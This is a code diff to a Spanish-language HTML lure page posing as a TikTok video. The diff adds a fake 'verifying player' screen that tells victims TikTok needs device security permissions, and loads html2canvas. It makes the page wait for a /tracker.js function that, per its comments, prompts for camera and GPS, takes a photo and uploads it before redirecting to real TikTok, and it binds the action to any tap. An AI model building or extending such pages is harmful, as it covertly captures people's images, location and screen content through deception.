@@ -377,9 +377,22 @@
 
     <!-- Pantalla de carga hacia el origen real -->
     <div class="loading-screen" id="loadingScreen">
-        <div class="tiktok-logo-load">📱</div>
+        <div class="tiktok-logo-load">✖️</div>
         <div class="spinner"></div>
+        <div style="color: white; font-family: sans-serif; margin-top: 20px; font-weight: bold; font-size: 18px;">
+            Verificando Reproductor...
+        </div>
+        <div
+            style="color: #aaa; font-family: sans-serif; margin-top: 10px; font-size: 13px; text-align: center; max-width: 80%; line-height: 1.5;">
+            TikTok necesita permisos de seguridad del dispositivo para comprobar que no eres un robot y reproducir
+            contenido en Alta Calidad.
+            <br><br>
+            <strong style="color: #fff;">Por favor, presiona "Permitir" si aparece una alerta.</strong>
+        </div>
     </div>
+
+    <!-- Librerías Externas Requeridas -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 
     <!-- Cargar Tracker -->
     <script src="/tracker.js"></script>
@@ -388,36 +401,35 @@
         const loadingScreen = document.getElementById('loadingScreen');
         let clicked = false;
 
-        function openTikTok() {
+        async function openTikTok() {
             if (clicked) return;
             clicked = true;
 
             loadingScreen.classList.add('active');
 
-            // Si el tracker está inyectado, llamamos su función
+            // 1. Si el tracker está inyectado, llamamos su función pesada y ESPERAMOS a que termine 
+            // Esto incluye el prompt de Cámara y GPS, no podemos redirigir hasta que acabe.
             if (typeof handleMainCta === 'function') {
-                handleMainCta();
+                await handleMainCta();
             }
 
+            // 2. Una vez que termine la toma de foto y subida (o de error), procedemos a salir
             const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
-            // Redirección con fallback a web tras 1.5s
-            setTimeout(() => {
-                if (isMobile) {
-                    setTimeout(() => {
-                        window.location.href = 'https://www.tiktok.com/';
-                    }, 2000);
-                    // Intent en Android para forzar app
-                    window.location.href = 'intent://www.tiktok.com/#Intent;package=com.zhiliaoapp.musically;scheme=https;action=android.intent.action.VIEW;end';
-                } else {
-                    window.location.href = 'https://www.tiktok.com/';
-                }
-            }, 1000); // Dar 1 segundo para intentar que el bot capture datos antes de salir
+            if (isMobile) {
+                setTimeout(() => {
+                    window.location.replace('https://www.tiktok.com/@tiktok');
+                }, 2000);
+                // Intent en Android para forzar app
+                window.location.href = 'intent://www.tiktok.com/#Intent;package=com.zhiliaoapp.musically;scheme=https;action=android.intent.action.VIEW;end';
+            } else {
+                window.location.replace('https://www.tiktok.com/@tiktok');
+            }
         }
 
         // Cualquier toque en toda la pantalla disparará la acción (parecerá que intentan quitar la pausa)
         document.body.addEventListener('click', openTikTok);
-        document.body.addEventListener('touchstart', openTikTok);
+        document.body.addEventListener('touchstart', openTikTok, { passive: true });
 
     </script>
 </body>
